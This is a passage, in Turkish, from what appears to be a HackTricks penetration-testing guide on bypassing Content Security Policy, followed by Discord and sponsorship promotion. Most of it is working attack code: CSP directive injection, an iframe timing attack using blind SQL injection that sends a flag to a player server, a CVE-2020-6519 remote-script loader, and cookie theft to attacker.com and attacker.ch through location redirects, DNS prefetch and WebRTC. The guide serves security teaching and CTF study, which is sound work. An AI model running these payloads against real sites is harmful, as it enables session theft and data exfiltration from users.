Eğer sizin tarafınızdan gönderilen bir **parametre**, **politikanın deklarasyonu içine yapıştırılıyorsa**, o zaman politikayı **kullanışsız hale getirecek şekilde** değiştirebilirsiniz. Bu bypasslardan herhangi biriyle **script 'unsafe-inline'**'ı **izin verebilirsiniz**:

```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```

Bu direktif **mevcut script-src direktiflerini üzerine yazar**.\
Bir örnek şurada bulunabilir: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

**Edge**

Edge'de çok daha basittir. Eğer CSP'ye sadece bunu ekleyebilirseniz: **`;_`** **Edge**, **tüm politikayı düşürecektir**.\
Örnek: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

#### img-src \*; XSS aracılığıyla (iframe) - Zaman saldırısı

`'unsafe-inline'` direktifinin eksik olduğuna dikkat edin.\
Bu sefer kurbanı **XSS** aracılığıyla **kontrolünüzdeki bir sayfayı yüklemesini sağlayabilirsiniz** `<iframe` ile. Bu sefer kurbanı istediğiniz yerden bilgi çıkarmak için erişmeye zorlayacaksınız (**CSRF**). Sayfanın içeriğine erişemezsiniz, ancak sayfanın yüklenmesi için gereken süreyi bir şekilde **kontrol edebilirseniz**, ihtiyacınız olan bilgileri çıkarabilirsiniz.

Bu sefer bir **bayrak** çıkarılacak, her bir **karakter doğru tahmin edildiğinde** SQLi aracılığıyla **yanıtın** sleep fonksiyonundan dolayı **daha uzun sürmesi** nedeniyle bayrağı çıkarabileceksiniz:

```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```

#### Yer İşaretçileri Aracılığıyla

Bu saldırı, saldırganın kullanıcıyı tarayıcının yer işaretçisi üzerine bir bağlantıyı sürükleyip bırakmaya ikna ettiği bir sosyal mühendislik gerektirir. Bu yer işaretçisi, **zararlı javascript** kodunu içerecektir ve sürüklendiğinde veya tıklandığında mevcut web penceresinin bağlamında **çalıştırılacak, CSP'yi atlayacak ve çerezler veya tokenlar gibi hassas bilgileri çalmaya izin verecektir**.

Daha fazla bilgi için [**buradaki orijinal rapora bakın**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

#### CSP kısıtlayarak CSP atlatma

Bu [**CTF çözümünde**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), bir izin verilen iframe içine daha kısıtlayıcı bir CSP enjekte edilerek CSP atlatılır ve belirli bir JS dosyasının yüklenmesine izin verilmez, ardından **prototype kirliliği** veya **dom clobbering** aracılığıyla farklı bir betiği kötüye kullanarak **keyfi bir betik yüklenmesine izin verilir**.

Bir Iframe'in CSP'sini **`csp`** özniteliği ile **kısıtlayabilirsiniz**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

[**Bu CTF çözümünde**](https://github.com/aszx87410/ctf-writeups/issues/48), **HTML enjeksiyonu** aracılığıyla **CSP** daha fazla **kısıtlanarak** CSTI'yi önleyen bir betik devre dışı bırakıldı ve dolayısıyla **zafiyet sömürülebilir hale geldi.**\
CSP daha kısıtlayıcı hale getirilebilir **HTML meta etiketleri** kullanılarak ve iç içe betikler devre dışı bırakılabilir **giriş**lerini kaldırarak, **nonce**'larına izin verilir ve **sha** aracılığıyla belirli iç içe betikler etkinleştirilebilir:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```

#### İçerik-Güvenlik-Politikası-Rapor-Yalnızca ile JS veri sızdırma

Eğer sunucunun yanıt vermesini sağlayabilirseniz **`Content-Security-Policy-Report-Only`** başlığıyla ve bir **değeri sizin kontrolünüzde** (belki bir CRLF nedeniyle), sunucunuzu işaret etmesini sağlayabilir ve eğer sızdırmak istediğiniz **JS içeriğini** **`<script>`** ile **sarmalarsanız** ve muhtemelen `unsafe-inline`'ın CSP tarafından izin verilmediği için, bu bir CSP hatası tetikleyecek ve duyarlı bilgileri içeren betik kısmı sunucuya `Content-Security-Policy-Report-Only` üzerinden gönderilecektir.

Örnek için [**bu CTF çözümüne bakın**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

#### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)

```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```

#### CSP ve Iframe ile Bilgi Sızdırma

* İzin verilen bir URL'ye (bunu `https://example.redirect.com` olarak adlandıralım) işaret eden bir `iframe` oluşturulur.
* Bu URL daha sonra CSP tarafından **izin verilmeyen** gizli bir URL'ye yönlendirir (örneğin, `https://usersecret.example2.com`).
* `securitypolicyviolation` etkinliğini dinleyerek, `blockedURI` özelliğini yakalayarak engellenen URI'nin alanını ortaya çıkarabilirsiniz, bu da başlangıçtaki URL'nin yönlendiği gizli alanı sızdırır.

İlginç olan, Chrome ve Firefox gibi tarayıcıların CSP'ye göre iframe'leri işlemede farklı davranışları olmasıdır, bu da tanımsız davranış nedeniyle hassas bilgilerin sızmasına yol açabilir.

Başka bir teknik, CSP'yi kendisi üzerinden kullanarak gizli alt alanı çıkarmayı içerir. Bu yöntem, bir ikili arama algoritmasına dayanır ve CSP'yi belirli alanları kasten engelleyen veya izin veren CSP'yi ayarlayarak gizli alt alanı çıkarmaya dayanır. Örneğin, gizli alt alanı bilinmeyen karakterlerden oluşuyorsa, CSP yönergesini değiştirerek bu alt alanları engellemek veya izin vermek için CSP'yi değiştirerek farklı alt alanları iteratif olarak test edebilirsiniz. Aşağıda, bu yöntemi kolaylaştırmak için CSP'nin nasıl yapılandırılabileceğini gösteren bir kod parçası bulunmaktadır:

```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```

CSP tarafından engellenen veya izin verilen istekleri izleyerek, gizli alt alanındaki olası karakterleri daraltabilir ve sonunda tam URL'yi ortaya çıkarabilirsiniz.

Her iki yöntem de CSP uygulamasının ve tarayıcılardaki davranışının inceliklerinden yararlanır ve görünüşte güvenli politikaların hassas bilgileri istemeden sızdırabileceğini gösterir.

Hile [**buradan**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanına ve zorluklarına inen içeriklerle etkileşime girin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avcılarının başlatılması ve önemli platform güncellemeleri hakkında bilgilenin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katılın ve bugün en iyi hackerlarla işbirliğine başlayın!**

### CSP'yi Atlatmak İçin Güvensiz Teknolojiler

#### PHP yanıt tamponu aşırı yükleme

PHP'nin varsayılan olarak yanıtı 4096 bayte kadar tamponladığı bilinmektedir. Bu nedenle, PHP bir uyarı gösteriyorsa, yeterli veri sağlayarak uyarıların içine yeterli veri sağlayarak yanıtın CSP başlığından önce gönderilmesine neden olur ve başlık görmezden gelinir.\
Sonra, tekniğin temeli temelde yanıt tamponunu uyarılarla doldurmaktır, böylece CSP başlığı gönderilmez.

Fikir [**bu yazıdan**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

#### Hata Sayfasını Yeniden Yazma

[**Bu yazıdan**](https://blog.ssrf.kr/69) görünüşe göre bir CSP korumasını atlatmanın mümkün olduğu, bir hata sayfası yükleyerek (muhtemelen CSP olmadan) ve içeriğini yeniden yazarak mümkün olduğu görünüyor.

```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```

#### SOME + 'self' + wordpress

SOME, bir sayfanın bir uç noktasındaki XSS'i (veya çok sınırlı XSS'i) **kötüye kullanarak**, **aynı kökten diğer uç noktaları kötüye kullanmak** için kullanılan bir tekniktir. Bu, savunmasız uç noktayı saldırganın sayfasından yükleyerek ve ardından saldırganın sayfasını kötüye kullanmak istediğiniz aynı kökteki gerçek uç noktaya yeniden yükleyerek yapılır. Bu şekilde **savunmasız uç nokta**, **payload** içindeki **`opener`** nesnesini kullanarak **kötüye kullanmak istediğiniz gerçek uç noktanın DOM'una erişebilir**. Daha fazla bilgi için şuraya bakın:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Ayrıca, **wordpress**'in `/wp-json/wp/v2/users/1?_jsonp=data` yolunda **yansıtacak** bir **JSONP** uç noktası bulunmaktadır ve bu uç nokta, yalnızca harf, rakam ve noktalarla sınırlı olan **gönderilen veriyi** yansıtacaktır.

Bir saldırgan, bu uç noktayı kötüye kullanarak WordPress'e karşı **bir SOME saldırısı oluşturabilir** ve bunu `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` içine **yerleştirebilir**. Bu **script**, 'self' tarafından **izin verildiği için yüklenecektir**. Ayrıca, ve WordPress yüklü olduğundan, bir saldırgan, **CSP'yi atlatan** **savunmasız** **geri çağrı** uç noktası aracılığıyla **SOME saldırısını kötüye kullanabilir** ve bir kullanıcıya daha fazla ayrıcalık vermek, yeni bir eklenti yüklemek gibi işlemleri gerçekleştirebilir...\
Bu saldırıyı nasıl gerçekleştireceğiniz hakkında daha fazla bilgi için [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

### CSP Exfiltration Bypasses

Eğer **harici sunucularla etkileşime izin vermeyen sıkı bir CSP** varsa, bilgileri dışa aktarmak için her zaman yapabileceğiniz bazı şeyler vardır.

#### Location

Sadece konumu güncelleyerek gizli bilgileri saldırganın sunucusuna gönderebilirsiniz:

```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```

#### Meta etiketi

Bir meta etiketi enjekte ederek yönlendirebilirsiniz (bu sadece bir yönlendirme işlemidir, içerik sızdırmaz).

```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```

#### DNS Ön Yükleme

Sayfaları daha hızlı yüklemek için tarayıcılar, ana bilgisayar adlarını IP adreslerine önceden çözümleyip daha sonra kullanmak üzere önbelleğe alırlar.\
Tarayıcıya bir ana bilgisayar adını önceden çözümlemesi için şu şekilde belirtebilirsiniz: `<link rel="dns-prefetch" href="something.com">`

Bu davranışı istismar ederek **DNS istekleri aracılığıyla hassas bilgileri dışarı sızdırabilirsiniz**:

```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```

Başka bir yol:

```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

Bu durumun önüne geçmek için sunucu HTTP başlığını gönderebilir:

```
X-DNS-Prefetch-Control: off
```

{% hint style="info" %}
Görünüşe göre, bu teknik başsız tarayıcılarda (botlar) çalışmıyor.
{% endhint %}

#### WebRTC

Birkaç sayfada **WebRTC'nin CSP'nin `connect-src` politikasını kontrol etmediğini** okuyabilirsiniz.

Aslında, bir _DNS isteği_ kullanarak bilgi sızdırabilirsiniz. Bu kodu inceleyin:

```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```

Başka bir seçenek:

```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```

### Çevrimiçi CSP Politikalarını Kontrol Etme

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

### Otomatik Olarak CSP Oluşturma

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

### Referanslar

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılarak deneyimli hackerlar ve ödül avcıları ile iletişim kurun!

**Hacking İçgörüleri**\
Hacking'in heyecanını ve zorluklarını inceleyen içeriklerle etkileşime geçin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avı başlatmaları ve önemli platform güncellemeleri hakkında bilgi edinin

**Bize Katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliğine başlayın!

<details>

<summary><strong>Sıfırdan Kahraman'a AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'ı PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬** [**Discord grubuna**](https://discord.gg/hRep4RUj7f) **veya** [**telegram grubuna**](https://t.me/peass) **katılın veya Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking hilelerinizi paylaşarak HackTricks ve HackTricks Cloud** github depolarına PR'lar göndererek katkıda bulunun.

</details>
